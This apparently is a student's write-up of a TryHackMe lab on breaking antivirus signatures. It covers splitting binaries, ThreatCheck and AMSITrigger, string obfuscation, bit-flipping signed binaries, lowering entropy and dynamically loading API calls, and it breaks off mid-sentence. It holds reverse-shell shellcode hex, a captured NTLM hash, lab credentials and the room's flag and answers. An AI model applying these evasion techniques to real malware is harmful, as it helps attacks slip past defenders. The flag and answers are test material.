---
Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/a4e6685f4861d637e699b729d04f5b66.png)

### Introduction 

An adversary may struggle to overcome specific detections when facing an advanced anti-virus engine or EDR (Endpoint Detection & Response) solution. Even after employing some of the most common obfuscation or evasion techniques discussed in Obfuscation Principles, signatures in a malicious file may still be present.
Decorative image of a toolbox

To combat persistent signatures, adversaries can observe each individually and address them as needed.

In this room, we will understand what signatures are and how to find them, then attempt to break them following an agnostic thought process. To dive deeper and combat heuristic signatures, we will also discuss more advanced code concepts and “malware best practices.”

![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1e9f66d4cc4de936cf372c1e7d4ceba1.png)

Learning Objectives

    Understand the origins of signatures and how to observe/detect them in malicious code
    Implement documented obfuscation methodology to break signatures
    Leverage non-obfuscation-based techniques to break non-function oriented signatures.

This room is a successor to Obfuscation Principles; we highly recommend completing it before this room if you have not already. 

Before beginning this room, familiarize yourself with basic programming logic and syntax. Knowledge of C and PowerShell is recommended but not required. 

We have provided a base Windows machine with the files needed to complete this room. You can access the machine in-browser or through RDP using the credentials below.

Machine IP: MACHINE_IP             Username: Student             Password: TryHackMe!

This is going to be a lot of information. Please locate your nearest hammer and fire extinguisher.

### Signature Identification 

Before jumping into breaking signatures, we need to understand and identify what we are looking for. As covered in Introduction to Anti-Virus, signatures are used by anti-virus engines to track and identify possible suspicious and/or malicious programs. In this task, we will observe how we can manually identify an exact byte where a signature starts.

When identifying signatures, whether manually or automated, we must employ an iterative process to determine what byte a signature starts at. By recursively splitting a compiled binary in half and testing it, we can get a rough estimate of a byte-range to investigate further.

We can use the native utilities head, dd, or split to split a compiled binary. In the below command prompt, we will walk through using head to find the first signature present in a msfvenom binary.

Once split, move the binary from your development environment to a machine with the anti-virus engine you would like to test on. If an alert appears, move to the lower half of the split binary and split it again. If an alert does not appear, move to the upper half of the split binary and split it again. Continue this pattern until you cannot determine where to go; this will typically occur around the kilobyte range.

Once you have reached the point at which you no longer accurately split the binary, you can use a hex editor to view the end of the binary where the signature is present.

0000C2E0  43 68 6E E9 0A 00 00 00 0C 4D 1A 8E 04 3A E9 89  Chné.....M.Ž.:é‰
0000C2F0  67 6F BE 46 01 00 00 6A 40 90 68 00 10 00 00 E9  go¾F...j@.h....é
0000C300  0A 00 00 00 53 DF A1 7F 64 ED 40 73 4A 64 56 90  ....Sß¡.dí@sJdV.
0000C310  6A 00 68 58 A4 53 E5 E9 08 00 00 00 15 0D 69 B6  j.hX¤Såé......i¶
0000C320  F4 AB 1B 73 FF D5 E9 0A 00 00 00 7D 43 00 40 DB  ô«.sÿÕé....}C.@Û
0000C330  43 8B AC 55 82 89 C3 90 E9 08 00 00 00 E4 95 8E  C‹¬U‚‰Ã.é....ä•Ž
0000C340  2C 06 AC 29 A3 89 C7 90 E9 0B 00 00 00 0B 32 AC  ,.¬)£‰Ç.é.....2¬

We have the location of a signature; how human-readable it is will be determined by the tool itself and the compilation method.

Now… no one wants to spend hours going back and forth trying to track down bad bytes; let’s automate it! In the next task, we will look at a few FOSS (Free and Open-Source Software) solutions to aid us in identifying signatures in compiled code.


	Using the knowledge gained throughout this task, split the binary found in C:\Users\Student\Desktop\Binaries\shell.exe using a native utility discussed in this task. Recursively determine if the split binary is detected until you have obtained the nearest kilobyte of the first signature.


Move the binary to a different folder without an exclusion to test against Defender
*No answer needed*


To the nearest kibibyte, what is the first detected byte?
Un kibibyte (KiB) es una unidad de almacenaje de data que equivale a 2 a la 10 potencia, o 1024 bytes. Un kilobyte se puede estimar que es 10^3 o 1000 bytes
*51000* (rounding 5048 found in next session)

### Automating Signature Identification 

The process shown in the previous task can be quite arduous. To speed it up, we can automate it using scripts to split bytes over an interval for us. [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1) will split a provided range of bytes through a given interval.

```

Find-AVSignature

           
PS C:\> . .\FInd-AVSignature.ps1
PS C:\> Find-AVSignature

cmdlet Find-AVSignature at command pipeline position 1
Supply values for the following parameters:
StartByte: 0
EndByte: max
Interval: 1000

Do you want to continue?
This script will result in 1 binaries being written to "C:\Users\TryHackMe"!
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): y

        


```

This script relieves a lot of the manual work, but still has several limitations. Although it requires less interaction than the previous task, it still requires an appropriate interval to be set to function properly. This script will also only observe strings of the binary when dropped to disk rather than scanning using the full functionality of the anti-virus engine.

To solve this problem we can use other FOSS (Free and Open-Source Software) tools that leverage the engines themselves to scan the file, including [DefenderCheck](https://github.com/matterpreter/DefenderCheck), [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), and [AMSITrigger](https://github.com/RythmStick/AMSITrigger). In this task, we will primarily focus on ThreatCheck and briefly mention the uses of AMSITrigger at the end.

ThreatCheck

ThreatCheck is a fork of DefenderCheck and is arguably the most widely used/reliable of the three. To identify possible signatures, ThreatCheck leverages several anti-virus engines against split compiled binaries and reports where it believes bad bytes are present.

	ThreatCheck does not provide a pre-compiled release to the public. For ease of use we have already compiled the tool for you; it can be found in C:\Users\Administrator\Desktop\Toolsof the attached machine.

Below is the basic syntax usage of ThreatCheck.

```
hreatCheck Help Menu

C:\>ThreatCheck.exe --help
  -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI
  -f, --file      Analyze a file on disk
  -u, --url       Analyze a file from a URL
  --help          Display this help screen.
  --version       Display version information.

```

For our uses we only need to supply a file and optionally an engine; however, we will primarily want to use AMSITrigger when dealing with AMSI (Anti-Malware Scan Interface), as we will discuss later in this task.

```

ThreatCheck

C:\>ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI
	[+] Target file size: 31744 bytes
	[+] Analyzing...
	[!] Identified end of bad bytes at offset 0x6D7A
	00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e·"·:·"·{·2·}·"·
	00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·"·t·o·k·e·n·"·
	00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{·
	00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·"·s·t·a·t·u·s·
	00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   "·:·"·{·0·}·"·,·
	00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "·o·u·t·p·u·t·"·
	00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·"·{·1·}·"·}·}·
	00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·"·G·U·I·D
	00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   ·"·:·"·{·0·}·"·,
	00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·"·T·y·p·e·"·:·{
	000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   ·1·}·,·"·M·e·t·a
	000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   ·"·:·"·{·2·}·"·,
	000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·"·I·V·"·:·"·{·3
	000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   ·}·"·,·"·E·n·c·r
	000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   ·y·p·t·e·d·M·e·s
	000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   ·s·a·g·e·"·:·"·{

```

It’s that simple! No other configuration or syntax is required and we can get straight to modifying our tooling. To efficiently use this tool we can identify any bad bytes that are first discovered then recursively break them and run the tool again until no signatures are identified.

Note: There may be instances of false positives, in which the tool will report no bad bytes. This will require your own intuition to observe and solve; however, we will discuss this further in task 4.
AMSITrigger

As covered in Runtime Detection Evasion,AMSI leverages the runtime, making signatures harder to identify and resolve. ThreatCheck also does not support certain file types such as PowerShell that AMSITrigger does.

AMSITrigger will leverage the AMSI engine and scan functions against a provided PowerShell script and report any specific sections of code it believes need to be alerted on.

AMSITrigger does provide a pre-compiled release on their GitHub and can also be found on the Desktop of the attached machine.

Below is the syntax usage of AMSITrigger

```

AMSITrigger Help Menu

C:\>amsitrigger.exe --help
	-i, --inputfile=VALUE       Powershell filename
	-u, --url=VALUE             URL eg. <https://10.1.1.1/Invoke-NinjaCopy.ps1>
	-f, --format=VALUE          Output Format:
	                              1 - Only show Triggers
	                              2 - Show Triggers with Line numbers
	                              3 - Show Triggers inline with code
	                              4 - Show AMSI calls (xmas tree mode)
	-d, --debug                 Show Debug Info
	-m, --maxsiglength=VALUE    Maximum signature Length to cater for,
	                              default=2048
	-c, --chunksize=VALUE       Chunk size to send to AMSIScanBuffer,
	                              default=4096
	-h, -?, --help              Show Help

```

For our uses we only need to supply a file and the preferred format to report signatures.

![[Pasted image 20220917120127.png]]

In the next task we will discuss how you can use the information gathered from these tools to break signatures.


	Using the knowledge gained throughout this task, identify bad bytes found in C:\Users\Student\Desktop\Binaries\shell.exe using ThreatCheck and the Defender engine. ThreatCheck may take up to 15 minutes to find the offset, in this case you can leave it running in the background, continue with the next task, and come back when it finishes.

```
C:\Users\Student\Desktop\Tools>.\ThreatCheck.exe -f C:\Users\Student\Desktop\Binaries\shell.exe -e Defender
[*] C:\Temp doesn't exist. Creating it...
[+] Target file size: 73802 bytes
[+] Analyzing...
[*] Testing 36901 bytes
[*] No threat found, increasing size
[*] Testing 55351 bytes
[*] Threat found, splitting
[*] Testing 46126 bytes
[*] No threat found, increasing size
[*] Testing 59964 bytes
[*] Threat found, splitting
[*] Testing 53045 bytes

Unhandled Exception: System.IO.IOException: The process cannot access the file 'C:\Temp\file.exe' because it is being used by another process.
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
   at System.IO.File.InternalWriteAllBytes(String path, Byte[] bytes, Boolean checkHost)
   at ThreatCheck.Defender.AnalyzeFile() in C:\Users\Dominic Cunningham\Downloads\ThreatCheck-master\ThreatCheck-master\ThreatCheck\ThreatCheck\Defender\Defender.cs:line 55
   at ThreatCheck.Program.ScanWithDefender(Byte[] file) in C:\Users\Dominic Cunningham\Downloads\ThreatCheck-master\ThreatCheck-master\ThreatCheck\ThreatCheck\Program.cs:line 114
   at ThreatCheck.Program.RunOptions(Options opts) in C:\Users\Dominic Cunningham\Downloads\ThreatCheck-master\ThreatCheck-master\ThreatCheck\ThreatCheck\Program.cs:line 85
   at CommandLine.ParserResultExtensions.WithParsed[T](ParserResult`1 result, Action`1 action)
   at ThreatCheck.Program.Main(String[] args) in C:\Users\Dominic Cunningham\Downloads\ThreatCheck-master\ThreatCheck-master\ThreatCheck\ThreatCheck\Program.cs:line 35

C:\Users\Student\Desktop\Tools>.\ThreatCheck.exe -f C:\Users\Student\Desktop\Binaries\shell.exe -e AMSI
[+] Target file size: 73802 bytes
[+] Analyzing...
[*] Testing 36901 bytes
[*] No threat found, increasing size
[*] Testing 55351 bytes
[*] Threat found, splitting
[*] Testing 46126 bytes
[*] No threat found, increasing size
[*] Testing 59964 bytes
[*] Threat found, splitting
[*] Testing 53045 bytes
[*] Threat found, splitting
[*] Testing 49585 bytes
[*] No threat found, increasing size
[*] Testing 61693 bytes
[*] Threat found, splitting
[*] Testing 55639 bytes
[*] Threat found, splitting
[*] Testing 52612 bytes
[*] Threat found, splitting
[*] Testing 51098 bytes
[*] Threat found, splitting
[*] Testing 50341 bytes
[*] No threat found, increasing size
[*] Testing 62071 bytes
[*] Threat found, splitting
[*] Testing 56206 bytes
[*] Threat found, splitting
[*] Testing 53273 bytes
[*] Threat found, splitting
[*] Testing 51807 bytes
[*] Threat found, splitting
[*] Testing 51074 bytes
[*] Threat found, splitting
[*] Testing 50707 bytes
[*] Threat found, splitting
[*] Testing 50524 bytes
[*] Threat found, splitting
[*] Testing 50432 bytes
[*] No threat found, increasing size
[*] Testing 62117 bytes
[*] Threat found, splitting
[*] Testing 56274 bytes
[*] Threat found, splitting
[*] Testing 53353 bytes
[*] Threat found, splitting
[*] Testing 51892 bytes
[*] Threat found, splitting
[*] Testing 51162 bytes
[*] Threat found, splitting
[*] Testing 50797 bytes
[*] Threat found, splitting
[*] Testing 50614 bytes
[*] Threat found, splitting
[*] Testing 50523 bytes
[*] Threat found, splitting
[*] Testing 50477 bytes
[*] No threat found, increasing size
[*] Testing 62139 bytes
[*] Threat found, splitting
[*] Testing 56308 bytes
[*] Threat found, splitting
[*] Testing 53392 bytes
[*] Threat found, splitting
[*] Testing 51934 bytes
[*] Threat found, splitting
[*] Testing 51205 bytes
[*] Threat found, splitting
[*] Testing 50841 bytes
[*] Threat found, splitting
[*] Testing 50659 bytes
[*] Threat found, splitting
[*] Testing 50568 bytes
[*] Threat found, splitting
[*] Testing 50522 bytes
[*] Threat found, splitting
[*] Testing 50499 bytes
[*] Threat found, splitting
[*] Testing 50488 bytes
[*] No threat found, increasing size
[*] Testing 62145 bytes
[*] Threat found, splitting
[*] Testing 56316 bytes
[*] Threat found, splitting
[*] Testing 53402 bytes
[*] Threat found, splitting
[*] Testing 51945 bytes
[*] Threat found, splitting
[*] Testing 51216 bytes
[*] Threat found, splitting
[*] Testing 50852 bytes
[*] Threat found, splitting
[*] Testing 50670 bytes
[*] Threat found, splitting
[*] Testing 50579 bytes
[*] Threat found, splitting
[*] Testing 50533 bytes
[*] Threat found, splitting
[*] Testing 50510 bytes
[*] Threat found, splitting
[*] Testing 50499 bytes
[*] Threat found, splitting
[*] Testing 50493 bytes
[*] No threat found, increasing size
[*] Testing 62147 bytes
[*] Threat found, splitting
[*] Testing 56320 bytes
[*] Threat found, splitting
[*] Testing 53406 bytes
[*] Threat found, splitting
[*] Testing 51949 bytes
[*] Threat found, splitting
[*] Testing 51221 bytes
[*] Threat found, splitting
[*] Testing 50857 bytes
[*] Threat found, splitting
[*] Testing 50675 bytes
[*] Threat found, splitting
[*] Testing 50584 bytes
[*] Threat found, splitting
[*] Testing 50538 bytes
[*] Threat found, splitting
[*] Testing 50515 bytes
[*] Threat found, splitting
[*] Testing 50504 bytes
[*] Threat found, splitting
[*] Testing 50498 bytes
[*] No threat found, increasing size
[*] Testing 62150 bytes
[*] Threat found, splitting
[*] Testing 56324 bytes
[*] Threat found, splitting
[*] Testing 53411 bytes
[*] Threat found, splitting
[*] Testing 51954 bytes
[*] Threat found, splitting
[*] Testing 51226 bytes
[*] Threat found, splitting
[*] Testing 50862 bytes
[*] Threat found, splitting
[*] Testing 50680 bytes
[*] Threat found, splitting
[*] Testing 50589 bytes
[*] Threat found, splitting
[*] Testing 50543 bytes
[*] Threat found, splitting
[*] Testing 50520 bytes
[*] Threat found, splitting
[*] Testing 50509 bytes
[*] Threat found, splitting
[*] Testing 50503 bytes
[*] Threat found, splitting
[*] Testing 50500 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xC544
00000000   95 CE 77 FF D5 90 E9 09  00 00 00 3C 7E 5F 66 24   ?IwÿO?é····<~_f$
00000010   8C 09 80 09 31 C0 E9 09  00 00 00 14 4A C5 E1 9B   ?·?·1Aé·····JÅá?
00000020   26 A5 81 BE 64 FF 30 90  64 89 20 90 E9 09 00 00   &¥?_dÿ0?d? ?é···
00000030   00 EF 4F E2 4F 7A FE 36  F1 04 FF D3 90 E9 24 FF   ·ïOâOz_6ñ·ÿO?é$ÿ
00000040   FF FF E8 E4 FE FF FF FC  E8 8F 00 00 00 60 31 D2   ÿÿèä_ÿÿüè?···`1O
00000050   89 E5 64 8B 52 30 8B 52  0C 8B 52 14 8B 72 28 0F   ?åd?R0?R·?R·?r(·
00000060   B7 4A 26 31 FF 31 C0 AC  3C 61 7C 02 2C 20 C1 CF   ·J&1ÿ1A¬<a|·, AI
00000070   0D 01 C7 49 75 EF 52 8B  52 10 57 8B 42 3C 01 D0   ··ÇIuïR?R·W?B<·D
00000080   8B 40 78 85 C0 74 4C 01  D0 8B 58 20 01 D3 50 8B   ?@x?AtL·D?X ·OP?
00000090   48 18 85 C9 74 3C 49 8B  34 8B 01 D6 31 FF 31 C0   H·?Ét<I?4?·Ö1ÿ1A
000000A0   AC C1 CF 0D 01 C7 38 E0  75 F4 03 7D F8 3B 7D 24   ¬AI··Ç8àuô·}o;}$
000000B0   75 E0 58 8B 58 24 01 D3  66 8B 0C 4B 8B 58 1C 01   uàX?X$·Of?·K?X··
000000C0   D3 8B 04 8B 01 D0 89 44  24 24 5B 5B 61 59 5A 51   O?·?·D?D$$[[aYZQ
000000D0   FF E0 58 5F 5A 8B 12 E9  80 FF FF FF 5D 68 33 32   ÿàX_Z?·é?ÿÿÿ]h32
000000E0   00 00 68 77 73 32 5F 54  68 4C 77 26 07 FF D5 B8   ··hws2_ThLw&·ÿO,
000000F0   90 01 00 00 29 C4 54 50  68 29 80 6B 00 FF D5 6A   ?···)ÄTPh)?k·ÿOj

[*] Run time: 731.67s
```

At what offset was the end of bad bytes for the file? 
*0xC544*

### Static Code-Based Signatures 

Once we have identified a troublesome signature we need to decide how we want to deal with it. Depending on the strength and type of signature, it may be broken using simple obfuscation as covered in Obfuscation Principles, or it may require specific investigation and remedy. In this task, we aim to provide several solutions to remedy static signatures present in functions.

The Layered Obfuscation Taxonomy covers the most reliable solutions as part of the Obfuscating Methods and Obfuscating Classes layer.

Obfuscating methods
Obfuscation Method
	Purpose
Method Proxy
	Creates a proxy method or a replacement object
Method Scattering/Aggregation
	Combine multiple methods into one or scatter a method into several
Method Clone
	Create replicas of a method and randomly call each

Obfuscating Classes
Obfuscation Method
	Purpose
Class Hierarchy Flattening
	Create proxies for classes using interfaces
Class Splitting/Coalescing
	Transfer local variables or instruction groups to another class
Dropping Modifiers
	Remove class modifiers (public, private) and make all members public

Looking at the above tables, even though they may use specific technical terms or ideas, we can group them into a core set of agnostic methods applicable to any object or data structure.

The techniques class splitting/coalescing and method scattering/aggregation can be grouped into an overarching concept of splitting or merging any given OOP (Object-Oriented Programming) function.

Other techniques such as dropping modifiers or method clone can be grouped into an overarching concept of removing or obscuring identifiable information.
Splitting and Merging Objects

The methodology required to split or merge objects is very similar to the objective of concatenation as covered in Obfuscation Principles.

The premise behind this concept is relatively easy, we are looking to create a new object function that can break the signature while maintaining the previous functionality.

To provide a more concrete example of this, we can use the well-known case study in Covenant present in the GetMessageFormat string. We will first look at how the solution was implemented then break it down and apply it to the obfuscation taxonomy.

Original String

Below is the original string that is detected

![[Pasted image 20220917123836.png]]

Obfuscated Method

Below is the new class used to replace and concatenate the string.

```
public static string GetMessageFormat // Format the public method
{
    get // Return the property value
    {
        var sb = new StringBuilder(@"{{""GUID"":""{0}"","); // Start the built-in concatenation method
        sb.Append(@"""Type"":{1},"); // Append substrings onto the string
        sb.Append(@"""Meta"":""{2}"",");
        sb.Append(@"""IV"":""{3}"",");
        sb.Append(@"""EncryptedMessage"":""{4}"",");
        sb.Append(@"""HMAC"":""{5}""}}");
        return sb.ToString(); // Return the concatenated string to the class
    }
}

string MessageFormat = GetMessageFormat

```

Recapping this case study, class splitting is used to create a new class for the local variable to concatenate. We will cover how to recognize when to use a specific method later in this task and throughout the practical challenge.
Removing and Obscuring Identifiable Information

The core concept behind removing identifiable information is similar to obscuring variable names as covered in Obfuscation Principles. In this task, we are taking it one step further by specifically applying it to identified signatures in any objects including methods and classes.

An example of this can be found in Mimikatz where an alert is generated for the string wdigest.dll. This can be solved by replacing the string with any random identifier changed throughout all instances of the string. This can be categorized in the obfuscation taxonomy under the method proxy technique.

This is almost no different than as discussed in Obfuscation Principles; however, it is applied to a specific situation.

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet, using AmsiTrigger to visual signatures.

![[Pasted image 20220917123956.png]]

Once sufficiently obfuscated, submit the snippet to the webserver at http://10.10.154.253/challenge-1.html. The file name must be saved as challenge-1.ps1. If correctly obfuscated a flag will appear in an alert pop-up

![[Pasted image 20220917132507.png]]

![[Pasted image 20220917132555.png]]

What flag is found after uploading a properly obfuscated snippet?
*THM{70_D373C7_0r_70_N07_D373C7}*  [64 page](https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20workshops/DEFCON-27-Workshop-Anthony-Rose-Introduction-to-AMSI-Bypasses-and-Sandbox-Evasion-Notes.pdf)

### Static Property-Based Signatures 

Various detection engines or analysts may consider different indicators rather than strings or static signatures to contribute to their hypothesis. Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such as YARA or Sigma.

Some properties may be easily manipulated, while others can be more difficult, specifically when dealing with pre-compiled closed-source applications.

This task will discuss manipulating the file hash and entropy of both open-source and closed-source applications.

Note: several other properties such as PE headers or module properties can be used as indicators. Because these properties often require an agent or other measures to detect, we will not cover them in this room to keep the focus on signatures.
File Hashes

A file hash, also known as a checksum, is used to tag/identify a unique file. They are commonly used to verify a file’s authenticity or its known purpose (malicious or not). File hashes are generally arbitrary to modify and are changed due to any modification to the file.

If we have access to the source for an application, we can modify any arbitrary section of the code and re-compile it to create a new hash. That solution is straightforward, but what if we need a pre-compiled or signed application?

When dealing with a signed or closed-source application, we must employ bit-flipping.

Bit-flipping is a common cryptographic attack that will mutate a given application by flipping and testing each possible bit until it finds a viable bit. By flipping one viable bit, it will change the signature and hash of the application while maintaining all functionality.

We can use a script to create a bit-flipped list by flipping each bit and creating a new mutated variant (~3000 - 200000 variants). Below is an example of a python bit-flipping implementation.

```
import sys

orig = list(open(sys.argv[1], "rb").read())

i = 0
while i < len(orig):
	current = list(orig)
	current[i] = chr(ord(current[i]) ^ 0xde)
	path = "%d.exe" % i
	
	output = "".join(str(e) for e in current)
	open(path, "wb").write(output)
	i += 1
	
print("done")
```

Once the list is created, we must search for intact unique properties of the file. For example, if we are bit-flipping msbuild, we need to use signtool to search for a file with a useable certificate. This will guarantee that the functionality of the file is not broken, and the application will maintain its signed attribution.

We can leverage a script to loop through the bit-flipped list and verify functional variants. Below is an example of a batch script implementation.

```
FOR /L %%A IN (1,1,10000) DO (
	signtool verify /v /a flipped\\%%A.exe
)
```

This technique can be very lucrative, although it can take a long time and will only have a limited period until the hash is discovered. Below is a comparison of the original MSBuild application and the bit-flipped variation.

Image of WinMD5Free showing the hash of Original.exe

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ab3f859f9dc34e6c4b41fe3437b2396d.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3e4c0050212e7c69d408135de36976a3.png)
Entropy

From IBM, Entropy is defined as “the randomness of the data in a file used to determine whether a file contains hidden data or suspicious scripts.” EDRs and other scanners often leverage entropy to identify potential suspicious files or contribute to an overall malicious score.

Entropy can be problematic for obfuscated scripts, specifically when obscuring identifiable information such as variables or functions.

To lower entropy, we can replace random identifiers with randomly selected English words. For example, we may change a variable from q234uf to nature.

To prove the efficacy of changing identifiers, we can observe how the entropy changes using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Entropy('Shannon%20scale')).

Below is the Shannon entropy scale for a standard English paragraph.

Shannon entropy: 4.587362034903882


![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/96630d6dbe47ad3204cc121e9b5bf84e.png)
Below is the Shannon entropy scale for a small script with random identifiers.

Shannon entropy: 5.341436973971389

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/92db2f5431d34098678bbcbf8170af52.png)

Depending on the EDR employed, a “suspicious” entropy value is ~ greater than 6.8.

The difference between a random value and English text will become amplified with a larger file and more occurrences.

Note that entropy will generally never be used alone and only to support a hypothesis. For example, the entropy for the command pskill and the hivenightmare exploit are almost identical.

To see entropy in action, let’s look at how an EDR would use it to contribute to threat indicators.

In the white paper, [An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors](https://www.mdpi.com/2624-800X/1/3/21/pdf), SentinelOne is shown to detect a DLL due to high entropy, specifically through AES encryption.



	Using CyberChef, obtain the Shannon entropy of the file: C:\Users\Student\Desktop\Binaries\shell.exe.

You can access cyberchef offline via the attackbox, and you can transfer the file using scp.

```
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username Student -password TryHackMe! public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.154.253,51064)
[*] AUTHENTICATE_MESSAGE (OBF-SERVER\Student,OBF-SERVER)
[*] User OBF-SERVER\Student authenticated successfully
[*] Student::OBF-SERVER:aaaaaaaaaaaaaaaa:e5c04d5d4658c35d4500736396755c06:01010000000000008064381dc6cad801c07711a75967de3700000000010010005600480063004c0045004d0079006300030010005600480063004c0045004d00790063000200100059007900470061006b006600670066000400100059007900470061006b00660067006600070008008064381dc6cad80106000400020000000800300030000000000000000000000000200000bd51131311655cede53295373024f999983f87e1e30a8698b059f7551e181e260a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,OBF-SERVER)
[*] Could not authenticate user!
[*] Disconnecting Share(1:IPC$)

C:\Users\Student>copy "C:\Users\Student\Desktop\Binaries\shell.exe" \\10.11.81.220\public\
        1 file(s) copied.


```

![[Pasted image 20220917135253.png]]

Rounded to three decimal places, what is the Shannon entropy of the file?
*6.354*

### Behavioral Signatures 

Obfuscating functions and properties can achieve a lot with minimal modification. Even after breaking static signatures attached to a file, modern engines may still observe the behavior and functionality of the binary. This presents numerous problems for attackers that cannot be solved with simple obfuscation.

As covered in Introduction to Anti-Virus, modern anti-virus engines will employ two common methods to detect behavior: observing imports and hooking known malicious calls. While imports, as will be covered in this task, can be easily obfuscated or modified with minimal requirements, hooking requires complex techniques out of scope for this room. Because of the prevalence of API calls specifically, observing these functions can be a significant factor in determining if a file is suspicious, along with other behavioral tests/considerations.

Before diving too deep into rewriting or importing calls, let’s discuss how API calls are traditionally utilized and imported. We will cover C-based languages first and then briefly cover .NET-based languages later in this task.

API calls and other functions native to an operating system require a pointer to a function address and a structure to utilize them.

Structures for functions are simple; they are located in import libraries such as kernel32 or ntdll that store function structures and other core information for Windows.

The most significant issue to function imports is the function addresses. Obtaining a pointer may seem straightforward, although because of ASLR (Address Space Layout Randomization), function addresses are dynamic and must be found.

Rather than altering code at runtime, the Windows loader windows.h is employed. At runtime, the loader will map all modules to process address space and list all functions from each. That handles the modules, but how are function addresses assigned?

One of the most critical functions of the Windows loader is the IAT (Import Address Table). The IAT will store function addresses for all imported functions that can assign a pointer for the function.

The IAT is stored in the PE (Portable Executable) header IMAGE_OPTIONAL_HEADER and is filled by the Windows loader at runtime. The Windows loader obtains the function addresses or, more precisely, thunks from a pointer table, accessed from an API call or thunk table. Check out the Windows Internals room for more information about the PE structure.

At a glance, an API is assigned a pointer to a thunk as the function address from the Windows loader. To make this a little more tangible, we can observe an example of the PE dump for a function.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/0d4ba9ba4348b53036cb2127f4968e87.png)

The import table can provide a lot of insight into the functionality of a binary that can be detrimental to an adversary. But how can we prevent our functions from appearing in the IAT if it is required to assign a function address?

As briefly mentioned, the thunk table is not the only way to obtain a pointer for a function address. We can also utilize an API call to obtain the function address from the import library itself. This technique is known as dynamic loading and can be used to avoid the IAT and minimize the use of the Windows loader.

We will write our structures and create new arbitrary names for functions to employ dynamic loading.

At a high level, we can break up dynamic loading in C languages into four steps,

    Define the structure of the call
    Obtain the handle of the module the call address is present in
    Obtain the process address of the call
    Use the newly created call

To begin dynamically loading an API call, we must first define a structure for the call before the main function. The call structure will define any inputs or outputs that may be required for the call to function. We can find structures for a specific call on the Microsoft documentation. For example, the structure for GetComputerNameA can be found [here](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea). Because we are implementing this as a new call in C, the syntax must change a little, but the structure stays the same, as seen below.

```
// 1. Define the structure of the call
typedef BOOL (WINAPI* myNotGetComputerNameA)(
	LPSTR   lpBuffer,
	LPDWORD nSize
);
```

To access the address of the API call, we must first load the library where it is defined. We will define this in the main function. This is commonly kernel32.dll or ntdll.dll for any Windows API calls. Below is an example of the syntax required to load a library into a module handle.

```
